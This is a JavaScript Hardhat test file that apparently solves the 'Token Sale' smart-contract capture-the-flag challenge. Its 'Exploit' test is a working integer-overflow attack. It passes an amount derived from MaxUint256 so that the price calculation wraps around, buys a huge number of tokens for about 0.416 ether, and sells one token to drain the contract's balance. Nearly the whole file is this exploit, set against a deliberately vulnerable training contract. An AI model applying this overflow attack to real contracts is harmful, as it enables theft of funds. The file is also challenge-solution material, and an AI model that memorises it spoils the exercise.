const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Token Sale', function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory('TokenSaleChallenge', deployer);
        this.tokenSale = await Factory.deploy(attacker.address, {value: ethers.utils.parseUnits("1")});
    });
    
    it('Exploit', async function () {
        let victimContract = this.tokenSale.connect(attacker);
        const maxValue = (ethers.constants.MaxUint256.div(ethers.utils.parseUnits("1"))).add(ethers.constants.One)
        await victimContract.buy(maxValue, {value: ethers.utils.parseUnits("0.415992086870360064")});
        await victimContract.sell(1);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.tokenSale.isComplete()
        ).to.be.eq(true);
    });
});